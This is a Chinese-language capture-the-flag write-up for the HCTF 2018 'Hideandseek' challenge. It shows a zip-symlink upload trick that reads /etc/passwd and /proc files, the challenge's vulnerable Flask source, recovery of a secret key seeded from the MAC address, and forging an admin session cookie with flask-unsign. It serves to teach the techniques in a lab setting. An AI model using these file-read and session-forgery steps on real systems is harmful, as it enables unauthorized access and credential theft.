# \[HCTF 2018]Hideandseek

## \[HCTF 2018]Hideandseek

## 考点

* Linux下的ln命令
* Python随机数漏洞
* flask session伪造

## wp

提示先登录，随便输账号密码，比如aaaa/aaaa，提示要上传压缩包

![](<../../.gitbook/assets/image (24).png>)

F12看到session是`eyJ1c2VybmFtZSI6ImFhYWEifQ.FVpCHQ.ekVxiCec35C4f6Dm2G2qW-HES7U`

解码是`{'username': 'aaaa'}`

上传一个压缩包，返回了压缩包中的文件内容，那这里使用`ln`软链接可能有任意文件读取，和[\[SWPU2019\]Web3](swpu2019-web3.md)差不多

* `ln -s /etc/passwd test`
* `zip -ry test.zip test`

![](<../../.gitbook/assets/image (28).png>)

读取`/proc/self/cmdline`，`/proc/self/environ`，`/proc/cmdline`，有用的就只有`/proc/self/environ`

{% code title="/proc/self/environ" %}
```
......
UWSGI_INI=/app/uwsgi.ini
PWD=/app
STATIC_PATH=/app/static
......
```
{% endcode %}

再读取`/app/uwsgi.ini`

```
[uwsgi] 
module=main 
callable=app 
logto=/tmp/hard_t0_guess_n9p2i5a6d1s_uwsgi.log
```

读取`/app/main.py`发现是个假的文件，原题的uwsgi.ini文件如下

```
[uwsgi]
module = hard_t0_guess_n9f5a95b5ku9fg.hard_t0_guess_also_df45v48ytj9_main
callable=app
logto = /tmp/hard_t0_guess_n9p2i5a6d1s_uwsgi.log
```

读取`/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py`

```python
# -*- coding: utf-8 -*-
from flask import Flask,session,render_template,redirect, url_for, escape, request,Response
import uuid
import base64
import random
import flag
from werkzeug.utils import secure_filename
import os
random.seed(uuid.getnode())
app = Flask(__name__)
app.config['SECRET_KEY'] = str(random.random()*100)
app.config['UPLOAD_FOLDER'] = './uploads'
app.config['MAX_CONTENT_LENGTH'] = 100 * 1024
ALLOWED_EXTENSIONS = set(['zip'])

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS


@app.route('/', methods=['GET'])
def index():
    error = request.args.get('error', '')
    if(error == '1'):
        session.pop('username', None)
        return render_template('index.html', forbidden=1)

    if 'username' in session:
        return render_template('index.html', user=session['username'], flag=flag.flag)
    else:
        return render_template('index.html')


@app.route('/login', methods=['POST'])
def login():
    username=request.form['username']
    password=request.form['password']
    if request.method == 'POST' and username != '' and password != '':
        if(username == 'admin'):
            return redirect(url_for('index',error=1))
        session['username'] = username
    return redirect(url_for('index'))


@app.route('/logout', methods=['GET'])
def logout():
    session.pop('username', None)
    return redirect(url_for('index'))

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'the_file' not in request.files:
        return redirect(url_for('index'))
    file = request.files['the_file']
    if file.filename == '':
        return redirect(url_for('index'))
    if file and allowed_file(file.filename):
        filename = secure_filename(file.filename)
        file_save_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        if(os.path.exists(file_save_path)):
            return 'This file already exists'
        file.save(file_save_path)
    else:
        return 'This file is not a zipfile'


    try:
        extract_path = file_save_path + '_'
        os.system('unzip -n ' + file_save_path + ' -d '+ extract_path)
        read_obj = os.popen('cat ' + extract_path + '/*')
        file = read_obj.read()
        read_obj.close()
        os.system('rm -rf ' + extract_path)
    except Exception as e:
        file = None

    os.remove(file_save_path)
    if(file != None):
        if(file.find(base64.b64decode('aGN0Zg==').decode('utf-8')) != -1):
            return redirect(url_for('index', error=1))
    return Response(file)


if __name__ == '__main__':
    #app.run(debug=True)
    app.run(host='0.0.0.0', debug=True, port=10008)
```

获取flag的条件是session的username为admin

值得注意的是，它使用了`random.seed(uuid.getnode())`去生成随机数种子，然后设置secret\_key为随机数`app.config['SECRET_KEY'] = str(random.random()*100)`

Python中的random是伪随机数，只要种子是一样的，后面产生的随机数也是一样的

uuid.getnode()是返回当前主机网卡MAC地址的十进制形式，Linux中记录MAC地址的文件是`/sys/class/net/eth0/address`或者 `/etc/sysconfig/network-scripts/ifcfg-eth0`

读取`/sys/class/net/eth0/address`，得到`9e:e1:ac:68:a3:d1`

```
>>> s='9e:e1:ac:68:a3:d1'.replace(':','')
>>> s
'9ee1ac68a3d1'
>>> int(s,16)
174692097369041
```

然后重新跑一下随机数，Python2和3都试一下

{% code title="Python3" %}
```
>>> import random
>>> mac=174692097369041
>>> random.seed(mac)
>>> random.random()*100
75.69105245694635
```
{% endcode %}

然后重新生成session

```
flask-unsign --sign --cookie "{'username': 'admin'}" --secret '75.69105245694635'
eyJ1c2VybmFtZSI6ImFkbWluIn0.Yni6fA.z7e5HN3WUPwOIVRa5fyltNYuG_4
```

这里的随机数考点和[\[CISCN2019 华东南赛区\]Web4](ciscn2019-hua-dong-nan-sai-qu-web4.md)一样。

![](<../../.gitbook/assets/image (25).png>)

## 小结

1. [\[CISCN2019 华东南赛区\]Web4](ciscn2019-hua-dong-nan-sai-qu-web4.md)+[\[SWPU2019\]Web3](swpu2019-web3.md)=本题
